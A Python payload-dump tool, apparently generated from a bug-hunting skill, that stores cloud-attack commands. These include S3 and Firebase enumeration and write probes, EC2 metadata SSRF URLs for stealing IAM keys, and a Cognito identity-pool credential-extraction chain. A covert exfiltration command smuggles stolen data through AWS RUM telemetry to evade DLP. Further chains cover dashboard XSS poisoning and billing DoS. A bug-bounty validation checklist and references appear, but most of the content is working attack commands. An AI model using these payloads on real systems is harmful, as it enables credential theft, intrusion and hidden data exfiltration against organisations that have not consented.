#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: claude-bughunter/hunt-cloud-misconfig

Skill: S3 listing
Desc : Hunt cloud / infrastructure misconfigurations. AWS: public S3 buckets (s3:GetObject anonymous), permissive bucket policies (PutObjectAcl public-write), exposed CloudFront origin, public Lambda function URL, public RDS snapshot, IAM credentials in JS bundles, AWS metadata accessible via SSRF. GCP: public GCS buckets, exposed Cloud Run services, leaked service account JSON. Azure: public blob containers, exposed Function App. (Kubernetes/Docker exposure is owned by hunt-k8s; CI/CD pipeline attacks by hunt-cicd; post-credential IAM escalation by cloud-iam-deep.) Detection: targeted dorking, certificate transparency, JS bundle secret extraction, port scan for known service ports. Validate: actual data read / write / RCE. Use when hunting cloud-native storage and compute misconfig (S3/GCS/Blob, IMDS-via-SSRF, serverless, public managed services).

Run:  python claude-bughunter-hunt-cloud-misconfig.py --help
      python claude-bughunter-hunt-cloud-misconfig.py --list
      python claude-bughunter-hunt-cloud-misconfig.py --dump <section>
"""
import sys, json, argparse

NAME = 'claude-bughunter/hunt-cloud-misconfig'
TITLE = 'S3 listing'
DESCRIPTION = 'Hunt cloud / infrastructure misconfigurations. AWS: public S3 buckets (s3:GetObject anonymous), permissive bucket policies (PutObjectAcl public-write), exposed CloudFront origin, public Lambda function URL, public RDS snapshot, IAM credentials in JS bundles, AWS metadata accessible via SSRF. GCP: public GCS buckets, exposed Cloud Run services, leaked service account JSON. Azure: public blob containers, exposed Function App. (Kubernetes/Docker exposure is owned by hunt-k8s; CI/CD pipeline attacks by hunt-cicd; post-credential IAM escalation by cloud-iam-deep.) Detection: targeted dorking, certificate transparency, JS bundle secret extraction, port scan for known service ports. Validate: actual data read / write / RCE. Use when hunting cloud-native storage and compute misconfig (S3/GCS/Blob, IMDS-via-SSRF, serverless, public managed services).'

PAYLOADS = {
    'main': ["name: hunt-cloud-misconfig", "description: \"Hunt cloud / infrastructure misconfigurations. AWS: public S3 buckets (s3:GetObject anonymous), permissive bucket policies (PutObjectAcl public-write), exposed CloudFront origin, public Lambda function URL, public RDS snapshot, IAM credentials in JS bundles, AWS metadata accessible via SSRF. GCP: public GCS buckets, exposed Cloud Run services, leaked service account JSON. Azure: public blob containers, exposed Function App. (Kubernetes/Docker exposure is owned by hunt-k8s; CI/CD pipeline attacks by hunt-cicd; post-credential IAM escalation by cloud-iam-deep.) Detection: targeted dorking, certificate transparency, JS bundle secret extraction, port scan for known service ports. Validate: actual data read / write / RCE. Use when hunting cloud-native storage and compute misconfig (S3/GCS/Blob, IMDS-via-SSRF, serverless, public managed services).\""],
    '16-cloud-infra-misconfigs': [],
    's3-gcs-azure-blob': ["```bash"],
    's3-listing': ["curl -s \"https://TARGET-NAME.s3.amazonaws.com/?max-keys=10\"", "aws s3 ls s3://target-bucket-name --no-sign-request"],
    'try-common-bucket-names': ["for name in target target-backup target-assets target-prod target-staging; do", "curl -s -o /dev/null -w \"$name: %{http_code}\\n\" \"https://$name.s3.amazonaws.com/\""],
    'firebase-open-rules': ["curl -s \"https://TARGET-APP.firebaseio.com/.json\"   # read", "curl -s -X PUT \"https://TARGET-APP.firebaseio.com/test.json\" -d '\"pwned\"'  # write"],
    'ec2-metadata-via-ssrf': ["```bash", "http://169.254.169.254/latest/meta-data/iam/security-credentials/  # role name", "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME  # keys"],
    'exposed-admin-panels': ["/jenkins  /grafana  /kibana  /elasticsearch  /swagger-ui.html", "/phpMyAdmin  /.env  /config.json  /api-docs  /server-status"],
    'local-verification-toolchain': ["For testing cloud-misconfig findings against a local AWS sim before/instead of hitting real cloud:", "```bash"],
    'localstack-3-0-community-pin-the-version-4-x-requires-a-pro-license': ["docker run -d --name lab-localstack -p 14566:4566 localstack/localstack:3.0"],
    'awscli-2-30-localstack-3-0-incompatibility-workaround-x-amz-trailer-header': ["export AWS_REQUEST_CHECKSUM_CALCULATION=when_required", "export AWS_RESPONSE_CHECKSUM_VALIDATION=when_required", "export AWS_ENDPOINT_URL=http://localhost:14566", "export AWS_ACCESS_KEY_ID=test AWS_SECRET_ACCESS_KEY=test AWS_DEFAULT_REGION=us-east-1", "Without those env vars, `aws s3 cp/sync` fails with `InvalidRequest`. Document this for the team. See `docs/verification/phase2j-cloud-localstack.md` for the full reproducible flow."],
    'cloudwatch-rum-weaponization-2024-2026-surface': ["AWS CloudWatch RUM (Real-User Monitoring) is a client-side telemetry service launched late 2021. Customers embed a JS snippet on their pages that sends performance/error events to `dataplane.rum.<region>.amazonaws.com`. The snippet's `AppMonitor` config contains an `identityPoolId` (Cognito) and `guestRoleArn` (IAM role) \u2014 both **public by design**. The IAM role policy is the security boundary, and when developers leave it broader than the documented minimum (`rum:PutRumEvents` on the AppMonitor ARN), the entire pool becomes the unauthenticated AWS-credential vending machine described in `cloud-iam-deep` \u2192 Cognito Identity Pool chain."],
    'detection-js-bundle-fingerprints': ["**Snippet-style (most common, embedded in `<head>`):**", "```javascript", "(function(n,i,v,r,s,c,x,z){...})(", "'cwr',", "'00000000-0000-0000-0000-000000000000',                       // applicationId (UUID)", "'1.0.0',", "'us-east-1',", "'https://client.rum.us-east-1.amazonaws.com/1.x/cwr.js',", "sessionSampleRate: 1,", "guestRoleArn: \"arn:aws:iam::123456789012:role/RUM-Monitor-...-Unauth\",", "identityPoolId: \"us-east-1:abcd1234-...\",", "endpoint: \"https://dataplane.rum.us-east-1.amazonaws.com\",", "telemetries: [\"errors\",\"performance\",\"http\"]", "**NPM-style (aws-rum-web package):**", "```javascript", "import { AwsRum, AwsRumConfig } from 'aws-rum-web';", "const config: AwsRumConfig = { identityPoolId, endpoint, guestRoleArn, ... };", "const awsRum = new AwsRum(APPLICATION_ID, '1.0.0', AWS_REGION, config);"],
    'regex-set-for-recon': ["```bash"],
    'detect-rum-init': ["grep -REn \"cwr\\(['\\\"]init['\\\"]|from\\s+['\\\"]aws-rum-web['\\\"]|new\\s+AwsRum\\(\" ."],
    'extract-applicationid-uuid-v4': ["grep -ErohE \"applicationId['\\\"]?\\s*[:=]\\s*['\\\"]([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})['\\\"]\" ."],
    'extract-identitypoolid-region-uuid': ["grep -ErohE \"identityPoolId['\\\"]?\\s*[:=]\\s*['\\\"]([a-z]{2}-[a-z]+-[0-9]+:[0-9a-f-]{36})['\\\"]\" ."],
    'extract-guestrolearn-leaks-aws-account-id-role-name': ["grep -ErohE \"guestRoleArn['\\\"]?\\s*[:=]\\s*['\\\"]arn:aws:iam::[0-9]{12}:role/[A-Za-z0-9._/-]+['\\\"]\" ."],
    'endpoint-reveals-region': ["grep -ErohE \"dataplane\\.rum\\.[a-z0-9-]+\\.amazonaws\\.com\" ."],
    'attack-chains': ["**Chain A \u2014 Credential extraction (Critical when guestRole is over-permissioned).** Once `identityPoolId` is extracted from the page, anyone runs:", "```bash", "aws cognito-identity get-id \\", "--identity-pool-id \"us-east-1:abcd1234-...\" \\", "--region us-east-1 --no-sign-request", "aws cognito-identity get-credentials-for-identity \\", "--identity-id \"us-east-1:<returned-uuid>\" \\", "--region us-east-1 --no-sign-request"],
    'sts-creds-export-and': ["aws sts get-caller-identity        # confirm role", "aws s3 ls; aws dynamodb list-tables; aws lambda list-functions; aws ssm describe-parameters; aws secretsmanager list-secrets"],
    'automate-pacu-enumerate-iam-py': ["Full chain documented in `cloud-iam-deep` \u2192 Cognito Identity Pool unauthenticated chain. RUM is one common embedding context.", "**Chain B \u2014 Telemetry endpoint covert exfil.** `dataplane.rum.<region>.amazonaws.com` is an **AWS-owned domain on every enterprise allowlist**. The `PutRumEvents` payload accepts arbitrary `userDetails` and `customEvents` string fields:", "```bash", "aws rum put-rum-events \\", "--id $(uuidgen) \\", "--app-monitor-details '{\"id\":\"<appId>\",\"version\":\"1.0.0\"}' \\", "--user-details '{\"userId\":\"EXFIL_PAYLOAD_HERE\",\"sessionId\":\"<session>\"}' \\", "--rum-events '[{\"id\":\"'$(uuidgen)'\",\"timestamp\":'$(date +%s)',\"type\":\"com.amazon.rum.custom_event\",\"details\":\"{\\\"exfil\\\":\\\"<base64 of stolen data>\\\"}\"}]' \\", "--endpoint-url \"https://dataplane.rum.us-east-1.amazonaws.com\" \\", "--region us-east-1", "Defenders watching egress see traffic to a known-good AWS hostname; DLP doesn't parse the JSON body; SIEM rules typically don't ingest customer RUM telemetry.", "**Chain C \u2014 DOM injection via snippet source poisoning.** Many customers either self-host `cwr.js` on their own CDN (`assets.target.com/cwr.js`) or bundle `aws-rum-web` and serve from `static.target.com/main.<hash>.js`. Subdomain takeover on the JS host or supply-chain compromise (npm typosquat against `aws-rum-webb`) gives persistent JS execution on every page-load with the trust of the `aws-rum-web` SDK \u2014 including its already-granted Cognito permissions.", "**Chain D \u2014 Telemetry injection / dashboard poisoning.** With the public `identityPoolId` + `applicationId`, an external attacker can flood `PutRumEvents` with fake error spikes (drown real alerts), inject XSS payloads into page-URL telemetry that fire when an SOC analyst views the CloudWatch dashboard, and inflate billable RUM event counts (financial DoS)."],
    'severity-rubric': [],
    'disclosed-cases-authoritative-writeups': ["No CVE assigned specifically to AWS RUM as of 2026-05. The attack class is documented in research but specific named bug-bounty payouts on RUM are rare in public hacktivity. The pattern is \"Cognito identity pool over-permission via embedded SDK\" \u2014 RUM is one common embedding.", "- **Andres Riancho \u2014 \"Misconfigured Cognito Identity Pools\" (2020/2023)** \u2014 establishes the attack class. [andresriancho.com](https://andresriancho.com/identity-pools-and-the-default-iam-role-trap/)", "- **Rhino Security Labs \u2014 Pacu `cognito__enum_identity_pools`** \u2014 production tooling that automates Chain A. [github.com/RhinoSecurityLabs/pacu](https://github.com/RhinoSecurityLabs/pacu)", "- **NotSoSecure / Claranet \u2014 \"Exploiting weak configurations in Amazon Cognito\" (Nov 2023)** \u2014 explicitly calls out RUM as one of three SDKs commonly leaking the pool ID. [notsosecure.com](https://www.notsosecure.com/exploiting-weak-configurations-in-amazon-cognito/)", "- **HackTricks Cloud \u2014 `aws-cognito-unauthenticated-enum`** \u2014 canonical playbook. [cloud.hacktricks.wiki](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html)", "- **Datadog Security Labs \u2014 \"Following AWS Logs Backwards: Cognito Identity Pool Abuse\" (2024)** \u2014 telemetry showing real-world abuse rates. [securitylabs.datadoghq.com](https://securitylabs.datadoghq.com/articles/abusing-aws-cognito-misconfigurations/)", "- **aws-observability/aws-rum-web GitHub issues #213, #404** \u2014 community discussion of the bundled-snippet security model. [github.com/aws-observability/aws-rum-web](https://github.com/aws-observability/aws-rum-web/issues)"],
    'validation-checklist-before-reporting': ["1. Extract `identityPoolId` from page source.", "2. Confirm pool allows unauth identities (`get-id` succeeds without auth).", "3. Confirm `get-credentials-for-identity` returns STS creds.", "4. Run `aws sts get-caller-identity` and **screenshot the role ARN**.", "5. Run `enumerate-iam` / Pacu `iam__enum_permissions` \u2014 capture **at least one allowed action beyond `rum:PutRumEvents`**. Without this, the finding is Informational.", "6. Demonstrate at least one read/list against a real resource (S3 bucket list, DynamoDB scan, Lambda invoke).", "7. **Do not** modify/delete data even if permitted \u2014 read-only PoC only."],
    'related-skills-chains': ["- **`hunt-subdomain`** \u2014 Stale CNAMEs pointing to deleted buckets are a takeover gold mine. Chain primitive: Cloud misconfig (S3 public/deleted) + `hunt-subdomain` \u2192 unclaimed CNAME points to bucket \u2192 `assets.target.com` takeover.", "- **`cloud-iam-deep`** \u2014 A leaked SA JSON / AWS key in a public bucket is only half the bug. Chain primitive: Public S3 + leaked AWS key in `.env` \u2192 `cloud-iam-deep` enumeration \u2192 cross-service `iam:PassRole` escalation.", "- **`hunt-ssrf`** \u2014 Metadata service is reachable only from inside the VPC; SSRF is the bridge. Chain primitive: SSRF + cloud misconfig (IMDSv1 still enabled) \u2192 instance role keys \u2192 S3/RDS data read.", "- **`supply-chain-attack-recon`** \u2014 Exposed CI/CD endpoints and SBOMs reveal internal package names. Chain primitive: Exposed Jenkins/GitLab + internal package name leak \u2192 npm/PyPI dependency-confusion publish \u2192 CI build pwn.", "- **`security-arsenal`** \u2014 Load the Cloud Bucket Wordlist (target-prod / target-backup / target-staging permutations) and the Admin-Panel Path List for fast enumeration.", "- **`triage-validation`** \u2014 Apply the Unique-Marker gate: any \"writable bucket\" claim requires a write of a unique marker file and a read-back from a clean session before report submission."],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()